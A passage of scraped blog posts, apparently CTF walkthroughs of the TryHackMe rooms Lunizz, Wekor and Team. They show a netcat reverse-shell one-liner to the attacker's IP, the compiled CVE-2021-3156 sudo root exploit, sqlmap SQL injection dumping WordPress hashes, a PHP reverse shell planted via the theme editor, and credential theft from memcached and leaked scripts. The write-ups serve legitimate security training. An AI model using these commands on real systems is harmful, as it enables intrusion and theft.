instructions.txt shown below contains credentials for mysql.\n1 2 3 4 5 6 7 8 9 10 11 12  Made By CTF_SCRIPTS_CAVE (not real) Thanks for installing our ctf script #Steps - Create a mysql user (runcheck:[REDACTED]) - Change necessary lines of config.php file Done you can start using ctf script #Notes please do not use default creds (IT\u0026#39;S DANGEROUS) \u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;---------------------------- READ THIS LINE PLEASE   MySQL Let us connect to the database using found username and password. Flag -u is for username, flag -p will prompted you to enter a password and flag -h represents a host.\n1 2 3 4 5 6 7 8 9 10  mysql -u runcheck -p -h 10.10.97.49 Enter password: Welcome to the MariaDB monitor. Commands end with ; or \\g. Your MySQL connection id is 7 Server version: 5.7.32-0ubuntu0.18.04.1 (Ubuntu) Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others. Type \u0026#39;help;\u0026#39; or \u0026#39;\\h\u0026#39; for help. Type \u0026#39;\\c\u0026#39; to clear the current input statement. MySQL [(none)]\u0026gt;   We successfully connected to the databases. Let us explore its content with the following commands.\n1 2 3 4 5 6 7 8 9 10  MySQL [(none)]\u0026gt; SHOW DATABASES; +--------------------+ | Database | +--------------------+ | information_schema | | runornot | +--------------------+ 2 rows in set (0.155 sec) MySQL [(none)]\u0026gt;   There are two databases, The default information_schema and runornot in which we are interested.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  MySQL [(none)]\u0026gt; use runornot; Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Database changed MySQL [runornot]\u0026gt; show tables; +--------------------+ | Tables_in_runornot | +--------------------+ | runcheck | +--------------------+ 1 row in set (0.069 sec) MySQL [runornot]\u0026gt; select * from runcheck; +------+ | run | +------+ | 0 | +------+ 1 row in set (0.049 sec)   Database runornot only contains one table called runcheck which only contains one column called run with a value of 0. This looks to be controlling the Command Executer Mode as it’s value is currently 0. We can update this value with the following command to 1.\n1 2 3 4 5 6 7 8 9 10 11 12 13  MySQL [runornot]\u0026gt; update runcheck set run = 1; Query OK, 1 row affected (0.083 sec) Rows matched: 1 Changed: 1 Warnings: 0 MySQL [runornot]\u0026gt; select * from runcheck; +------+ | run | +------+ | 1 | +------+ 1 row in set (0.075 sec) MySQL [runornot]\u0026gt;   Gaining Access Command Executer Mode in the /whatever resource changed from 0 to 1.\n\nNow we can execute commands as shown above with id.\nFrom the command executor, we can get a reverse shell. We will submit the following command and before that we will start a netcat listener on our local machine.\n1  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.9.140.180 8888 \u0026gt;/tmp/f   We will get a shell as www-data user.\n1 2 3 4 5 6 7 8  nc -lnvp 8888 [sudo] password for squ33ker: listening on [any] 8888 ... connect to [10.9.140.180] from (UNKNOWN) [10.10.97.49] 45248 /bin/sh: 0: can\u0026#39;t access tty; job control turned off $ id uid=33(www-data) gid=33(www-data) groups=33(www-data) $   In the first place, let us upgrade and stabilize the shell which we got by executing the following commands.\n1 2 3 4 5 6 7 8 9 10  $ python3 -c \u0026#34;import pty;pty.spawn(\u0026#39;/bin/bash\u0026#39;)\u0026#34; www-data@lunizz:/var/www/html/whatever$ export SHELL=/bin/bash;export TERM=xterm-256color \u0026lt;$ export SHELL=/bin/bash;export TERM=xterm-256color www-data@lunizz:/var/www/html/whatever$ ^Z [1]+ Stopped nc -lnvp 8888 stty raw -echo; fg nc -lnvp 8888 www-data@lunizz:/var/www/html/whatever$   Manually enumerating the system, we can find a directory called proct which is not a default subdirectory in root.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45  www-data@lunizz:/$ ls -la total 1878124 drwxr-xr-x 25 root root 4096 Dec 14 04:53 . drwxr-xr-x 25 root root 4096 Dec 14 04:53 .. drwxr-xr-x 2 root root 4096 Dec 10 19:05 bin drwxr-xr-x 4 root root 4096 Dec 14 04:53 boot drwxr-xr-x 2 root root 4096 Dec 10 18:55 cdrom drwxr-xr-x 18 root root 3760 Mar 31 19:13 dev drwxr-xr-x 96 root root 4096 Dec 16 05:02 etc drwxr-xr-x 4 root root 4096 Dec 10 19:18 home lrwxrwxrwx 1 root root 34 Dec 14 04:53 initrd.img -\u0026gt; boot/initrd.img-4.15.0-128-generic lrwxrwxrwx 1 root root 34 Dec 10 18:59 initrd.img.old -\u0026gt; boot/initrd.img-4.15.0-124-generic drwxr-xr-x 22 root root 4096 Dec 10 20:06 lib drwxr-xr-x 2 root root 4096 Dec 10 20:05 lib64 drwx------ 2 root root 16384 Dec 10 18:54 lost+found drwxr-xr-x 2 root root 4096 Aug 6 2020 media drwxr-xr-x 2 root root 4096 Aug 6 2020 mnt drwxr-xr-x 2 root root 4096 Aug 6 2020 opt dr-xr-xr-x 116 root root 0 Mar 31 19:13 proc drwxr-xr-x 3 root root 4096 Dec 10 19:17 proct drwx------ 6 root root 4096 Dec 10 19:58 root drwxr-xr-x 27 root root 880 Mar 31 19:18 run drwxr-xr-x 2 root root 12288 Dec 10 19:05 sbin drwxr-xr-x 2 root root 4096 Dec 10 19:09 snap drwxr-xr-x 2 root root 4096 Aug 6 2020 srv -rw------- 1 root root 1923088384 Dec 10 18:59 swap.img dr-xr-xr-x 13 root root 0 Mar 31 19:13 sys drwxrwxrwt 2 root root 4096 Mar 31 19:56 tmp drwxr-xr-x 10 root root 4096 Aug 6 2020 usr drwxr-xr-x 14 root root 4096 Dec 10 19:19 var lrwxrwxrwx 1 root root 31 Dec 14 04:53 vmlinuz -\u0026gt; boot/vmlinuz-4.15.0-128-generic lrwxrwxrwx 1 root root 31 Dec 10 18:59 vmlinuz.old -\u0026gt; boot/vmlinuz-4.15.0-124-generic www-data@lunizz:/$ cd proct www-data@lunizz:/proct$ ls -la total 12 drwxr-xr-x 3 root root 4096 Dec 10 19:17 . drwxr-xr-x 25 root root 4096 Dec 14 04:53 .. drwxr-xr-x 2 root root 4096 Dec 10 19:26 pass www-data@lunizz:/proct$ cd pass www-data@lunizz:/proct/pass$ ls -la total 12 drwxr-xr-x 2 root root 4096 Dec 10 19:26 . drwxr-xr-x 3 root root 4096 Dec 10 19:17 .. -rw-r--r-- 1 adam adam 433 Dec 7 21:47 bcrypt_encryption.py www-data@lunizz:/proct/pass$ cat bcrypt_encryption.py   Directory proct contains a subdirectory called pass which contains a python script.\n1 2 3 4 5 6 7 8 9 10 11  import bcrypt import base64 password = # https://www.youtube.com/watch?v=-tJYN-eG1zk\u0026amp;ab_channel=QueenOfficial bpass = password.encode(\u0026#39;ascii\u0026#39;) passed= str(base64.b64encode(bpass)) hashAndSalt = bcrypt.hashpw(passed.encode(), bcrypt.gensalt()) print(hashAndSalt) salt = b\u0026#39;$2b$12$SVInH5XmuS3C7eQkmqa6UOM6sDIuumJPrvuiTr.Lbz3GCcUqdf.z6\u0026#39; # I wrote this code last year and i didnt save password verify line... I need to find my password   Probably we can build upon this script and horizontally escalate our privileges, but let us enumerate the system further.\nPrivilege Escalation Version of sudo program 1.8.21p2 is vulnerable to a heap buffer overflow discovered by The Qualys Research Team. You can read the full report with technical details on their blog.\n1 2 3 4 5 6  www-data@lunizz:/proct/pass$ sudo --version Sudo version 1.8.21p2 Sudoers policy plugin version 1.8.21p2 Sudoers file grammar version 46 Sudoers I/O plugin version 1.8.21p2 www-data@lunizz:/proct/pass$ cd /var/backups/   Baron Samedit (CVE-2021-3156) Found heap buffer overflow vulnerability called Baron Samedit (CVE-2021-3156)\nallows any user to escalate privileges to root.\n This exploit works with the default settings, for any user regardless of sudo permissions. The vulnerability has been patched, but affects any unpatched version of the sudo program from 1.8.2-1.8.31p2 and 1.9.0-1.9.5p1, meaning that it\u0026rsquo;s been around for the last ten years.\nfrom TryHackMe room Baron Samedit by MuirlandOracle\n We will download a provided exploit from GitHub to our local machine and transfer it by hosting a python server and downloading the whole folder on the target machine with wget. The flag -r is for recursive download and the flag --no-parent is a useful option, which guarantees that only the files below a certain hierarchy will be downloaded.\n1 2 3 4 5 6 7 8 9 10 11  # local machine python3 -m http.server 8000 # target machine www-data@lunizz:/dev/shm$ wget -r --no-parent 10.9.140.180:8000/CVE-2021-3156 . . . www-data@lunizz:/dev/shm$ ls -la total 0 drwxrwxrwt 3 root root 60 Mar 31 20:25 . drwxr-xr-x 18 root root 3760 Mar 31 19:13 .. drwxr-xr-x 3 www-data www-data 60 Mar 31 20:25 10.9.140.180:8000   We can automatically compile the exploit simply by typing make in the CVE-2021-3156 directory where are all the files located. New executable will be created called sudo-hax-me-a-sandwich. Running this executable will list available targets.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  www-data@lunizz:/dev/shm/10.9.140.180:8000/CVE-2021-3156$ make rm -rf libnss_X mkdir libnss_X gcc -std=c99 -o sudo-hax-me-a-sandwich hax.c gcc -fPIC -shared -o \u0026#39;libnss_X/P0P_SH3LLZ_ .so.2\u0026#39; lib.c www-data@lunizz:/dev/shm/10.9.140.180:8000/CVE-2021-3156$ ls -la total 40 drwxr-xr-x 3 www-data www-data 180 Mar 31 20:27 . drwxr-xr-x 3 www-data www-data 60 Mar 31 20:25 .. -rw-r--r-- 1 www-data www-data 264 Mar 31 20:17 Makefile -rw-r--r-- 1 www-data www-data 1187 Mar 31 20:17 README.md -rw-r--r-- 1 www-data www-data 1994 Mar 31 20:17 brute.sh -rw-r--r-- 1 www-data www-data 4420 Mar 31 20:17 hax.c -rw-r--r-- 1 www-data www-data 407 Mar 31 20:17 lib.c drwxr-xr-x 2 www-data www-data 60 Mar 31 20:27 libnss_X -rwxr-xr-x 1 www-data www-data 13040 Mar 31 20:27 sudo-hax-me-a-sandwich www-data@lunizz:/dev/shm/10.9.140.180:8000/CVE-2021-3156$ ./sudo-hax-me-a-sandwic ** CVE-2021-3156 PoC by blasty \u0026lt;peter@haxx.in\u0026gt; usage: ./sudo-hax-me-a-sandwich \u0026lt;target\u0026gt; available targets: ------------------------------------------------------------ 0) Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27 1) Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31 2) Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28 ------------------------------------------------------------ manual mode: ./sudo-hax-me-a-sandwich \u0026lt;smash_len_a\u0026gt; \u0026lt;smash_len_b\u0026gt; \u0026lt;null_stomp_len\u0026gt; \u0026lt;lc_all_len\u0026gt;   From the nmap scan, we know that the system is running Ubuntu. Version of sudo program is 1.8.21p2. This means we will choose the option 0.\n1 2 3 4 5 6 7 8 9 10  www-data@lunizz:/dev/shm/10.9.140.180:8000/CVE-2021-3156$ ./sudo-hax-me-a-sandwic 0 ** CVE-2021-3156 PoC by blasty \u0026lt;peter@haxx.in\u0026gt; using target: Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27 [\u0026#39;/usr/bin/sudoedit\u0026#39;] (56, 54, 63, 212) ** pray for your rootshell.. ** [+] bl1ng bl1ng! We got it! # id uid=0(root) gid=0(root) groups=0(root),33(www-data) #    The exploit was successful and our privileges are escalated to root.\n\rThank you for reading this blog post.\n","description":"Lunizz CTF","id":9,"section":"posts","tags":["enumeration","sql","remote code execution","exploitation","privilege escalation"],"title":"Lunizz CTF [TryHackMe]","uri":"https://martinkubecka.github.io/posts/thm/luniz-ctf/"},{"content":"   Title  Wekor     Info  CTF challenge involving Sqli, WordPress, vhost enumeration and recognizing internal services.   Difficulty  Medium   Date 2021/03/09    Scanning \u0026amp; Enumeration We are given a host with IP address 10.10.14.2\nNmap Let\u0026rsquo;s start by running a port scan on the host using nmap. The output of the scan can be seen below:\n1 2 3 4 5 6 7 8 9  nmap -sS -sV -T4 wekor.thm Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-09 11:30 CST Nmap scan report for wekor.thm (10.10.14.2) Host is up (0.073s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel   \nRobots.txt Visiting the robots.txt, we get many different directory paths.\n1 2 3 4 5 6 7 8 9 10  User-agent: * Disallow: /workshop/ Disallow: /root/ Disallow: /lol/ Disallow: /agent/ Disallow: /feed Disallow: /crawler Disallow: /boot Disallow: /comingreallysoon Disallow: /interesting   Visiting these directories redirect us to 404 (Not Found), except /comingreallysoon. Navigating to this location, we will find a message which contains a path to the actual website.\n Welcome Dear Client! We\u0026rsquo;ve setup our latest website on /it-next, Please go check it out! If you have any comments or suggestions, please tweet them to @faketwitteraccount! Thanks a lot !\n \nSQLi Enumerating the website and testing for possible SQL injection, we will get reflected error message when putting a single quote inside the Coupon code field in the user\u0026rsquo;s cart.\n\nBefore running sqlmap, start Burp Suite and intercept the request for applying coupon code. Here we are looking for variables and their values, which we will then use for --data flag. To list available databases, we will add --dbs.\n1 2 3 4 5 6 7 8 9 10 11 12  sqlmap -u http://wekor.thm/it-next/it_cart.php --data=\u0026#34;coupon_code=\u0026amp;apply_coupon=Apply%20Coupon\u0026#34; --dbs . . . [12:05:25] [INFO] fetching database names available databases [6]: [*] coupons [*] information_schema [*] mysql [*] performance_schema [*] sys [*] wordpress   Let us proceed with findings and list tables for this database with --tables flag.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  sqlmap -u http://wekor.thm/it-next/it_cart.php --data=\u0026#34;coupon_code=\u0026amp;apply_coupon=Apply%20Coupon\u0026#34; -D wordpress --tables . . . [12:08:58] [INFO] the back-end DBMS is MySQL back-end DBMS: MySQL 5 [12:08:58] [INFO] fetching tables for database: \u0026#39;wordpress\u0026#39; Database: wordpress [12 tables] +-----------------------+ | wp_commentmeta | | wp_comments | | wp_links | | wp_options | | wp_postmeta | | wp_posts | | wp_term_relationships | | wp_term_taxonomy | | wp_termmeta | | wp_terms | | wp_usermeta | | wp_users | +-----------------------+   Dumping credentials with --dump, we will obtain four user names and their password hashes.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  sqlmap -u http://wekor.thm/it-next/it_cart.php --data=\u0026#34;coupon_code=\u0026amp;apply_coupon=Apply%20Coupon\u0026#34; -D wordpress -T wp_users --dump . . . Database: wordpress Table: wp_users [4 entries] +------+---------------------------------+------------------------------------+-------------------+------------+-------------+--------------+---------------+---------------------+-----------------------------------------------+ | ID | user_url | user_pass | user_email | user_login | user_status | display_name | user_nicename | user_registered | user_activation_key | +------+---------------------------------+------------------------------------+-------------------+------------+-------------+--------------+---------------+---------------------+-----------------------------------------------+ | 1 | http://site.wekor.thm/wordpress | $P$BoyfR2QzhNjRNmQZpva6TuuD0EE31B. | admin@wekor.thm | admin | 0 | admin | admin | 2021-01-21 20:33:37 | \u0026lt;blank\u0026gt; | | 5743 | http://jeffrey.com | $P$BU8QpWD.kHZv3Vd1r52ibmO913hmj10 | jeffrey@wekor.thm | wp_jeffrey | 0 | wp jeffrey | wp_jeffrey | 2021-01-21 20:34:50 | 1611261290:$P$BufzJsT0fhM94swehg1bpDVTupoxPE0 | | 5773 | http://yura.com | $P$B6jSC3m7WdMlLi1/NDb3OFhqv536SV/ | yura@wekor.thm | wp_yura | 0 | wp yura | wp_yura | 2021-01-21 20:35:27 | \u0026lt;blank\u0026gt; | | 5873 | http://eagle.com | $P$BpyTRbmvfcKyTrbDzaK1zSPgM7J6QY/ | eagle@wekor.thm | wp_eagle | 0 | wp eagle | wp_eagle | 2021-01-21 20:36:11 | \u0026lt;blank\u0026gt; | +------+---------------------------------+------------------------------------+-------------------+------------+-------------+--------------+---------------+---------------------+-----------------------------------------------+   Also notice a new subdomain under admin in the user_url column. We will add site.wekor.thm to our /etc/hosts. Based on the wordpress database name, we can assume that the found website is actually build with WordPress.\n NOTE : When looking for Virtual Host use gobuster with vhost mode.\n1  gobuster vhost -u wekor.thm -w /usr/share/seclists/Discovery/DNS/fierce-hostlist.txt    To crack found hashes, we will need to save them into a file and then provide it to john with wordlist of your choice.\n1 2 3 4 5 6 7 8 9  john wordpress-hashes --wordlist=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8 Loaded 4 password hashes with 4 different salts (phpass [phpass ($P$ or $H$) 128/128 AVX 4x3]) Cost 1 (iteration count) is 8192 for all loaded hashes Will run 2 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status rockyou (wp_jeffrey) xxxxxx (wp_eagle) soccer13 (wp_yura)   Wordpress Login portal is located here :\nhttp://site.wekor.thm/wordpress/wp-admin\nAll credentials are valid and we are able to login to their Wordpress accounts. User wp_yura is the page admin so we will proceed enumeration on their profile.\nGaining Access Theme Exploitation Based on the previous experiences with gaining access to system through Wordpress (ColddBox, Mr Robot CTF), we know that it is possible to obtain a reverse shell via Theme Editor.\nWe will choose 404.php and replace it with php reverse shell.\n1 2  $ip = \u0026#39;10.9.140.180\u0026#39;; // CHANGE THIS $port = 4444; // CHANGE THIS   Pressing Update File button, 404.php content will be replace with our malicious reverse shell.\nBefore visiting updated php file, don’t forget to start a listener on your local machine.\nNavigate to the path below, we will gain access as a www-data user.\nhttp://site.wekor.thm/wordpress/index.php/whatever\n1 2 3 4 5 6 7 8 9 10 11 12  nc -lnvp 4444 listening on [any] 4444 ... connect to [10.9.140.180] from (UNKNOWN) [10.10.14.2] 43880 Linux osboxes 4.15.0-133-generic #137~16.04.1-Ubuntu SMP Fri Jan 15 02:55:05 UTC 2021 i686 i686 i686 GNU/Linux 13:25:49 up 1:15, 0 users, load average: 0.01, 0.02, 0.00 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) /bin/sh: 0: can\u0026#39;t access tty; job control turned off $ whoami;id;hostname www-data uid=33(www-data) gid=33(www-data) groups=33(www-data) osboxes    Stabilize the shell with python one liner :\n1  python -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39;;    Enumeration Performing basic manual enumeration, we will find a local service running on the port number 11211.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  www-data@osboxes:/$ netstat -tulnp netstat -tulnp (Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.) Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 127.0.0.1:3010 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:11211 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:631 0.0.0.0:* LISTEN - tcp6 0 0 :::80 :::* LISTEN - tcp6 0 0 :::22 :::* LISTEN - tcp6 0 0 ::1:631 :::* LISTEN - udp 0 0 0.0.0.0:68 0.0.0.0:* - udp 0 0 0.0.0.0:631 0.0.0.0:* - udp 0 0 0.0.0.0:45195 0.0.0.0:* - udp 0 0 0.0.0.0:5353 0.0.0.0:* - udp6 0 0 :::5353 :::* - udp6 0 0 :::53036 :::* -   This service is called Memcached which is a distributed memory object caching system.\n Memcached is an in-memory key-value store for small chunks of arbitrary data (strings, objects) from results of database calls, API calls, or page rendering.\n Using memcached-tool script with dump argument, we will dump the cached data, which contains password for user Orka.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  ww-data@osboxes:/usr/share/memcached/scripts$ ls -la ls -la total 56 drwxr-xr-x 2 root root 4096 Jan 22 10:27 . drwxr-xr-x 3 root root 4096 Jan 22 10:27 .. -rw-r--r-- 1 root root 638 Sep 5 2019 README.damemtop -rwxr-xr-x 1 root root 15891 Sep 5 2019 damemtop -rw-r--r-- 1 root root 294 Sep 5 2019 damemtop.yaml -rwxr-xr-x 1 root root 7812 Sep 5 2019 mc_slab_mover -rwxr-xr-x 1 root root 5692 Sep 5 2019 memcached-tool -rwxr-xr-x 1 root root 2770 Sep 5 2019 start-memcached -rwxr-xr-x 1 root root 1423 Sep 5 2019 systemd-memcached-wrapper www-data@osboxes:/usr/share/memcached/scripts$ ./memcached-tool localhost:11211 dump \u0026lt;/memcached/scripts$ ./memcached-tool localhost:11211 dump Dumping memcache contents Number of buckets: 1 Number of items : 5 Dumping bucket 1 - 5 total items add email 0 1615309833 14 Orka@wekor.thm add password 0 1615309833 15 [REDACTED] add salary 0 1615309833 8 $100,000 add id 0 1615309833 4 3476 add username 0 1615309833 4 Orka   Lateral Movement Let us switch to Orka user and grab the user flag located in the their home directory.\n1 2 3 4 5 6 7 8  www-data@osboxes:/usr/share/memcached/scripts$ su Orka su Orka Password: OrkAiSC00L24/7$ Orka@osboxes:~$ id id uid=1001(Orka) gid=1001(Orka) groups=1001(Orka) Orka@osboxes:~$ cat user.txt | wc -c 33   By issuing sudo -l we can see which commands we can execute as root and some other important information.\n1 2 3 4 5 6 7 8 9 10  Orka@osboxes:~$ sudo -l sudo -l [sudo] password for Orka: OrkAiSC00L24/7$ Matching Defaults entries for Orka on osboxes: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User Orka may run the following commands on osboxes: (root) /home/Orka/Desktop/bitcoin   We can execute bitcoin as root.\nPrivilege Escalation 1 2 3 4 5 6 7  Orka@osboxes:~/Desktop$ ls -la ls -la total 20 drwxrwxr-x 2 root root 4096 Jan 23 17:45 . drwxr-xr-- 18 Orka Orka 4096 Feb 1 13:50 .. -rwxr-xr-x 1 root root 7696 Jan 23 15:23 bitcoin -rwxr--r-- 1 root root 588 Jan 23 14:27 transfer.py   We cannot modify the transfer.py script nor bitcoin.\nWith file command, we can determine that the bitcoin is an executable.\n1 2  Orka@osboxes:~$ file /home/Orka/Desktop/bitcoin bitcoin: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8280915d0ebb7225ed63f226c15cee11ce960b6b, not stripped   Let us replace the bitcoin executable with bash and get the root shell.\n1 2 3 4 5 6  Orka@osboxes:~$ mv Desktop original Orka@osboxes:~$ mkdir Desktop Orka@osboxes:~$ cp /bin/bash ./Desktop/bitcoin Orka@osboxes:~$ sudo /home/Orka/Desktop/bitcoin root@osboxes:~/Desktop# id uid=0(root) gid=0(root) groups=0(root)   \rThank you for reading this blog post.\n","description":"CTF challenge involving Sqli, WordPress, vhost enumeration and recognizing internal services.","id":10,"section":"posts","tags":["enumeration","sqli","remote code execution","wordpress","privilege escalation"],"title":"Wekor [TryHackMe]","uri":"https://martinkubecka.github.io/posts/thm/wekor/"},{"content":"   Title  Team     Info   Beginner friendly boot2root machine   Difficulty   Easy   Date 2021/03/08    Scanning \u0026amp; Enumeration We are given a host with IP address 10.10.135.37\nNmap Let\u0026rsquo;s start by running a port scan on the host using nmap. The output of the scan can be seen below:\n1 2 3 4 5 6 7 8 9 10  PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 79:5f:11:6a:85:c2:08:24:30:6c:d4:88:74:1b:79:4d (RSA) | 256 af:7e:3f:7e:b4:86:58:83:f1:f6:a2:54:a6:9b:ba:ad (ECDSA) |_ 256 26:25:b0:7b:dc:3f:b2:94:37:12:5d💿06:98:c7:9f (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works! If you see this add \u0026#39;te...   Since we don\u0026rsquo;t have SSH credentials and FTP doesn\u0026rsquo;t provide Anonymous login we will proceed with webserver enumeration.\nAfter visiting the IP address in the browser, we are presented with the Apache2 default page.\n\nThis page does not contain anything useful, so we will add team.thm domain to our /etc/hosts.\nnano /etc/hosts\r127.0.0.1 localhost\r127.0.1.1 kali\r10.10.135.37 team.thm\rThen, we will navigate to this domain in our browser.\n\nAnd we have a site. Performing basic enumeration, once again we will find anything what might be used as an attack vector.\nDirectory Brute-Forcing 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  root@kali:~# gobuster dir -e -u http://team.thm -w /usr/share/wordlists/dirb/common.txt =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://team.thm [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Expanded: true [+] Timeout: 10s =============================================================== 2021/03/08 10:58:58 Starting gobuster =============================================================== http://team.thm/.hta (Status: 403) http://team.thm/.htaccess (Status: 403) http://team.thm/.htpasswd (Status: 403) http://team.thm/assets (Status: 301) http://team.thm/images (Status: 301) http://team.thm/index.html (Status: 200) http://team.thm/robots.txt (Status: 200) http://team.thm/scripts (Status: 301) http://team.thm/server-status (Status: 403)   Proceeding with directory brute force, we will find robots.txt including a name and scripts folder on which, we will perform another brute force.\nhttp://team.thm/robots.txt\rdale\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  root@kali:~# gobuster dir -e -u http://team.thm/scripts -w /usr/share/wordlists/dirb/common.txt -x .txt,.bak,.old =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://team.thm/scripts [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Extensions: txt,bak,old [+] Expanded: true [+] Timeout: 10s =============================================================== 2021/03/08 11:07:25 Starting gobuster =============================================================== http://team.thm/scripts/.hta (Status: 403) http://team.thm/scripts/.hta.txt (Status: 403) http://team.thm/scripts/.hta.bak (Status: 403) http://team.thm/scripts/.hta.old (Status: 403) http://team.thm/scripts/.htaccess (Status: 403) http://team.thm/scripts/.htaccess.txt (Status: 403) http://team.thm/scripts/.htaccess.bak (Status: 403) http://team.thm/scripts/.htaccess.old (Status: 403) http://team.thm/scripts/.htpasswd (Status: 403) http://team.thm/scripts/.htpasswd.txt (Status: 403) http://team.thm/scripts/.htpasswd.bak (Status: 403) http://team.thm/scripts/.htpasswd.old (Status: 403) http://team.thm/scripts/script.old (Status: 200) http://team.thm/scripts/script.txt (Status: 200)   On the output above, we can see too interesting files script.txt and script.old\nIn the first file username and password are redacted.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  #!/bin/bash read -p \u0026#34;Enter Username: \u0026#34; REDACTED read -sp \u0026#34;Enter Username Password: \u0026#34; REDACTED echo ftp_server=\u0026#34;localhost\u0026#34; ftp_username=\u0026#34;$Username\u0026#34; ftp_password=\u0026#34;$Password\u0026#34; mkdir /home/username/linux/source_folder source_folder=\u0026#34;/home/username/source_folder/\u0026#34; cp -avr config* $source_folder dest_folder=\u0026#34;/home/username/linux/dest_folder/\u0026#34; ftp -in $ftp_server \u0026lt;\u0026lt;END_SCRIPT quote USER $ftp_username quote PASS $decrypt cd $source_folder !cd $dest_folder mget -R * quit # Updated version of the script # Note to self had to change the extension of the old \u0026#34;script\u0026#34; in this folder, as it has creds in   The second file script.old contains both username and password.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  #!/bin/bash read -p \u0026#34;Enter Username: \u0026#34; ftpuser read -sp \u0026#34;Enter Username Password: \u0026#34; T3@m$h@r3 echo ftp_server=\u0026#34;localhost\u0026#34; ftp_username=\u0026#34;$Username\u0026#34; ftp_password=\u0026#34;$Password\u0026#34; mkdir /home/username/linux/source_folder source_folder=\u0026#34;/home/username/source_folder/\u0026#34; cp -avr config* $source_folder dest_folder=\u0026#34;/home/username/linux/dest_folder/\u0026#34; ftp -in $ftp_server \u0026lt;\u0026lt;END_SCRIPT quote USER $ftp_username quote PASS $decrypt cd $source_folder !cd $dest_folder mget -R * quit   FTP Access Found credentials can be used for FTP authentication. Enumerating we will find few interesting files.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  ftp 10.10.135.37 Connected to 10.10.135.37. 220 (vsFTPd 3.0.3) Name (10.10.135.37:root): ftpuser 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls -la 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x 5 65534 65534 4096 Jan 15 20:25 . drwxr-xr-x 5 65534 65534 4096 Jan 15 20:25 .. -rw-r--r-- 1 1002 1002 220 Apr 04 2018 .bash_logout -rw-r--r-- 1 1002 1002 3771 Apr 04 2018 .bashrc drwxrwxr-x 3 1002 1002 4096 Jan 15 20:22 .local -rw-r--r-- 1 1002 1002 807 Apr 04 2018 .profile drwx------ 2 1002 1002 4096 Jan 15 20:24 .ssh drwxrwxr-x 2 65534 65534 4096 Jan 15 20:25 workshare 226 Directory send OK.   Note 1 2 3 4 5 6 7 8 9 10 11 12 13  ftp\u0026gt; ls -la 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxrwxr-x 2 65534 65534 4096 Jan 15 20:25 . drwxr-xr-x 5 65534 65534 4096 Jan 15 20:25 .. 